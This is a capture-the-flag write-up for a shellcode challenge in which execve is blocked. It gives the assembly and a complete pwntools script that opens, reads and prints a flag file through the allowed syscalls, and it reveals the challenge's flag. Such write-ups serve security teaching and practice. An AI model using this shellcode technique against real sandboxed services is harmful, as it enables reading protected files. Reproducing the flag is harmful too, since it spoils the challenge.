## Description :

Mr. Krabs has heard about these so-called "shellcode hackers" trying to break into his secret vault. So he hired the barnacles.

They said no execve. Something about a "Strict Sea Policy."

You'll need to get creative if you want that flag.

sc broncoctf-crab-trap.chals.io

nc 0.cloud.chals.io 34381

## Flag

```text
bronco{h0w_c4n_mr_kr4b5_c0de}
```

The challenge gave us a remote service that accepts shellcode. When connecting using Netcat, the server displayed the following message:

```text
┌──(kali㉿kali)-[~/Downloads]
└─$ nc 0.cloud.chals.io 34381

   /\_/\   /\_/\
 =( ^.^ )=( ^.^ )=
  | (") |  | (") |
   \___/    \___/
  ~~ THE CRAB TRAP ~~

 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Welcome to Mr. Krabs' Shellcode Emporium!
  "I like money... and restricted syscalls."

  *** STRICT SEA POLICY IN EFFECT ***
  Allowed syscalls: open, read, write
  execve?  The barnacles will DESTROY you.
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


[*] Drop your crab feed into the trap (max 512 bytes):
> 

```

Later, a hint was also provided:

```text
The flag can be found at:
/home/ctf/flag.txt
```

From this, I understood that I could not execute `/bin/sh` because the `execve` syscall was blocked. Instead, I needed to read the flag file directly.

---

# Initial Analysis

Normally, shellcode is written to execute:

```text
execve("/bin/sh")
```

which gives us a shell.

However, this challenge only allowed these three system calls:

* open
* read
* write

Since `execve` was blocked, getting a shell was impossible.

So I needed another approach.

---

# Solution Idea

Instead of opening a shell, I decided to:

1. Open the flag file.
2. Read its contents.
3. Print the contents to the screen.

Since all three required syscalls were allowed, this approach would bypass the restriction completely.

---

# Step 1 - Connect to the Challenge

First, I connected to the remote service.

```bash
nc 0.cloud.chals.io 34381
```

The server displayed the shellcode challenge banner and waited for my payload.

---

# Step 2 - Write the Shellcode

I used **pwntools** to generate x86-64 shellcode.

First, I set the architecture.

```python
from pwn import *

context.arch = "amd64"
```

---

# Step 3 - Open the Flag File

The challenge hint told us that the flag is stored at:

```text
/home/ctf/flag.txt
```

The shellcode first opens this file.

```asm
mov rax, 2
lea rdi, [rip+path]
xor rsi, rsi
xor rdx, rdx
syscall
```

Here,

* `rax = 2` calls `open()`
* `rdi` points to the filename
* `rsi = 0` means read-only mode

---

# Step 4 - Read the File

After opening the file, the returned file descriptor is stored in `rax`.

Next, I read the file into memory.

```asm
mov rdi, rax
xor rax, rax
mov rsi, rsp
mov rdx, 0x100
syscall
```

This reads up to 256 bytes from the file into the stack.

---

# Step 5 - Print the Flag

Once the flag was stored in memory, I printed it to standard output.

```asm
mov rdx, rax
mov rax, 1
mov rdi, 1
mov rsi, rsp
syscall
```

This performs:

```text
write(1, buffer, bytes_read)
```

which prints the flag on the terminal.

---

# Step 6 - Send the Shellcode

Finally, I connected to the remote server using pwntools and sent my shellcode.

```python
p = remote("0.cloud.chals.io", 34381)
p.recvuntil(b"> ")
p.send(sc)
p.interactive()
```

After the shellcode executed, the server printed the contents of the flag file.

---

# Complete Exploit

```python
from pwn import *

context.arch = "amd64"

sc = asm(r"""
    /* open("/home/ctf/flag.txt", O_RDONLY) */
    mov rax, 2
    lea rdi, [rip+path]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    /* if open failed, loop */
    cmp rax, 0
    jl fail

    /* read(fd, rsp, 0x100) */
    mov rdi, rax
    xor rax, rax
    mov rsi, rsp
    mov rdx, 0x100
    syscall

    /* write(1, rsp, bytes_read) */
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    syscall

hang:
    jmp hang

fail:
    jmp fail

path:
    .ascii "/home/ctf/flag.txt\0"
""")

p = remote("0.cloud.chals.io", 34381)
p.recvuntil(b"> ")
p.send(sc)
p.interactive()
```

---

# Output

```text
bronco{h0w_c4n_mr_kr4b5_c0de}
```

---

# Why the Solution Works

The challenge blocks only the `execve` syscall to prevent players from spawning a shell.

However, it still allows:

* `open()`
* `read()`
* `write()`

Since these are enough to directly access and display a file, we can simply read the flag from disk without ever executing another program.

This completely bypasses the need for a shell.

